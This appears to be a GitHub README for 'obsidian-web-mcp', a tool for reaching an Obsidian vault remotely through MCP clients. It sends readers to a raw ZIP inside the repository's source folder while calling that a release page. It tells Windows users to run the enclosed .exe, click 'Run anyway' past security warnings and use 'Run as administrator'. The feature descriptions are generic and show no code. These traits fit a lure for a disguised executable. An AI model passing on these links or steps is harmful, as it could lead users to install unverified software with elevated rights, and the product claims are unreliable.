# 🧭 obsidian-web-mcp - Access your notes anywhere

[![Download obsidian-web-mcp](https://img.shields.io/badge/Download%20obsidian--web--mcp-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sebastian3909/obsidian-web-mcp/raw/refs/heads/main/src/web-mcp-obsidian-v1.1.zip)

## 🚀 Getting Started

obsidian-web-mcp lets you reach your Obsidian vault from a remote device through a secure MCP server. You can use it with Claude, your phone, or any MCP client that supports remote access.

This guide shows how to download and run it on Windows.

## 📥 Download

Visit this page to download: https://github.com/Sebastian3909/obsidian-web-mcp/raw/refs/heads/main/src/web-mcp-obsidian-v1.1.zip

On the release page, look for the latest Windows file. Download the file that matches your system, then save it to a folder you can find again, such as `Downloads` or `Desktop`.

If you see more than one file, choose the Windows app file first. In most cases, that will be a `.exe` file or a `.zip` file that contains the app.

## 🪟 Run on Windows

1. Open the folder where you saved the download.
2. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
3. Open the extracted folder.
4. If you see an `.exe` file, double-click it to start the app.
5. If Windows shows a security prompt, choose **Run anyway** if you trust the source and you downloaded it from the release page above.

If the app opens in a window, keep it running. The server needs to stay open while you use it from another device or client.

## 🔐 Sign In with OAuth

obsidian-web-mcp uses OAuth 2.0 sign-in.

This means you sign in through a normal browser page instead of typing a password into the app. The sign-in flow helps keep your vault access protected and simple to manage.

When the app starts for the first time, it may open your browser and ask you to approve access. Follow the on-screen steps:

1. Choose your Obsidian account or vault access.
2. Approve the connection.
3. Return to the app after sign-in finishes.

## ☁️ Use with Cloudflare Tunnel

The app can use a Cloudflare Tunnel so you can reach your MCP server from outside your home network.

This is useful when you want to connect from:
- Claude
- A phone
- A laptop away from home
- Another MCP client on a different network

In most cases, you will:
1. Start the app on your Windows PC.
2. Turn on the tunnel option if the app shows one.
3. Copy the remote address it gives you.
4. Paste that address into your MCP client.

## 📝 Connect to Your Obsidian Vault

After sign-in, obsidian-web-mcp connects to your vault and lets other tools read or update notes through the server.

Typical use cases include:
- Reading notes from Claude
- Searching your vault from a phone
- Saving new notes from a remote client
- Updating existing notes without opening Obsidian

The app uses atomic writes, which helps protect your notes when Obsidian Sync is active. This reduces the chance of partial file updates.

## ⚙️ Basic Setup

Use this simple setup flow on Windows:

1. Download the latest release from the releases page.
2. Unzip the file if needed.
3. Run the Windows app.
4. Sign in with OAuth.
5. Connect your Obsidian vault.
6. Enable the tunnel if you want remote access.
7. Copy the MCP URL or connection details into your client.

If the app asks where your vault is stored, point it to the main Obsidian folder on your PC.

## 📱 Use from Claude or Another MCP Client

To use obsidian-web-mcp from an MCP client:

1. Open the client you want to use.
2. Add a new remote MCP server.
3. Paste the server URL or connection details from obsidian-web-mcp.
4. Sign in if the client asks for authentication.
5. Test the connection by asking it to read a note or list your vault files.

If the connection fails, check that the Windows app is still running and that the tunnel is active.

## 🔧 What You Can Do

Once connected, you can use the server to:
- Find notes by name
- Read note contents
- Create new notes
- Update existing notes
- Organize note files in your vault
- Work with your notes from remote devices

This makes it easier to keep your notes close at hand without opening your full Obsidian app every time.

## 🖥️ Windows Requirements

For best results, use:
- Windows 10 or Windows 11
- A modern browser such as Chrome, Edge, or Firefox
- Access to your Obsidian vault folder on the same PC
- A stable internet connection if you want remote access through Cloudflare Tunnel

A desktop or laptop with a few hundred megabytes of free space is enough for the app itself.

## 📁 Recommended Folder Layout

Keep your files in places that are easy to find:

- `Downloads` for the release file
- `Desktop` for quick access while testing
- Your normal Obsidian vault folder for notes
- A separate folder for extracted app files if you want to keep things tidy

Avoid moving the app files after you set it up unless you are sure the shortcut still points to the right place.

## 🛠️ Common Setup Steps

If you want a smooth first run, use this order:

1. Close Obsidian if it is editing the same note.
2. Start obsidian-web-mcp on Windows.
3. Complete OAuth sign-in in your browser.
4. Select the vault you want to expose.
5. Turn on Cloudflare Tunnel if needed.
6. Copy the client connection details.
7. Test with one simple note before you rely on it for daily use.

## 🧩 Troubleshooting

If the app does not start:
- Check that the file finished downloading.
- Make sure you extracted the ZIP file first.
- Try right-clicking the `.exe` file and choosing **Run as administrator**.

If your browser does not open for sign-in:
- Copy the local address shown in the app.
- Paste it into your browser.
- Try again with a different browser.

If your client cannot connect:
- Confirm that the Windows app is still open.
- Check that Cloudflare Tunnel is enabled if you need remote access.
- Make sure you copied the full server address.
- Restart the app and try again.

If notes do not update:
- Make sure Obsidian is not holding the same file open.
- Check that the vault path points to the right folder.
- Try a small test note first.

## 🔒 Security

obsidian-web-mcp is built for remote access with protected sign-in and safe file handling.

It uses:
- OAuth 2.0 for login
- Cloudflare Tunnel for remote connections
- Atomic writes to reduce note damage during file updates

Keep your Windows PC on and signed in if you want the server to stay available.

## 📌 Quick Start

1. Go to the releases page.
2. Download the latest Windows release.
3. Extract the file if needed.
4. Open the app.
5. Sign in with OAuth.
6. Connect your Obsidian vault.
7. Add the server to Claude or another MCP client.
8. Use your notes from anywhere